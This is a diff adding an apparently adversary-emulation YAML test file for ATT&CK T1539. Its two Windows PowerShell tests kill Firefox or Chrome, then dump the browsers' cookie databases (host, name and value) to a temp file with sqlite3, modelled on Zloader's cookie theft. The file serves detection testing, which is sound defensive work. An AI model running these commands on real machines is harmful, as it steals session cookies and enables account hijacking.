@@ -1,0 +1,77 @@
+attack_technique: T1539
+display_name: Steal Web Session Cookie 
+atomic_tests:
+- name: Steal Firefox Cookies (Windows)
+  auto_generated_guid: 4b437357-f4e9-4c84-9fa6-9bcee6f826aa
+  description: |
+    This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. 
+    Note: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. 
+    See https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. 
+  supported_platforms:
+  - windows
+  input_arguments:
+    sqlite3_path:
+      description: Path to sqlite3
+      type: Path
+      default: $env:temp\sqlite-tools-win32-x86-3380200\sqlite3.exe
+    output_file:
+      description: Filepath to output cookies
+      type: Path
+      default: $env:temp\T1539FirefoxCookies.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Sqlite3 must exist at (#{sqlite3_path})
+    prereq_command: |
+      if (Test-Path #{sqlite3_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "$env:temp\sqlite.zip"
+      Expand-Archive -path "$env:temp\sqlite.zip" -destinationpath "$env:temp\" -force
+  executor:
+    command: |
+     stop-process -name "firefox" -force -erroraction silentlycontinue
+     $CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"
+     "select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c #{sqlite3_path} "$CookieDBLocation" | out-file -filepath "#{output_file}"
+    cleanup_command: | 
+     remove-item #{output_file} -erroraction silentlycontinue
+    name: powershell
+    elevation_required: false
+- name: Steal Chrome Cookies (Windows)
+  auto_generated_guid: 26a6b840-4943-4965-8df5-ef1f9a282440
+  description: |
+    This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. 
+    Once an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. 
+    Note: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. 
+    See https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. 
+  supported_platforms:
+  - windows
+  input_arguments:
+    cookie_db:
+      description: Filepath for Chrome cookies database
+      type: String
+      default: $env:localappdata\Google\Chrome\User Data\Default\Network\Cookies
+    sqlite3_path:
+      description: Path to sqlite3
+      type: Path
+      default: $env:temp\sqlite-tools-win32-x86-3380200\sqlite3.exe
+    output_file:
+      description: Filepath to output cookies
+      type: Path
+      default: $env:temp\T1539ChromeCookies.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Sqlite3 must exist at (#{sqlite3_path})
+    prereq_command: |
+      if (Test-Path #{sqlite3_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "$env:temp\sqlite.zip"
+      Expand-Archive -path "$env:temp\sqlite.zip" -destinationpath "$env:temp\" -force
+  executor:
+    command: |
+     stop-process -name "chrome" -force -erroraction silentlycontinue
+     "select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c #{sqlite3_path} "#{cookie_db}" | out-file -filepath "#{output_file}"
+    cleanup_command: | 
+     remove-item #{output_file}
+    name: powershell
+    elevation_required: false
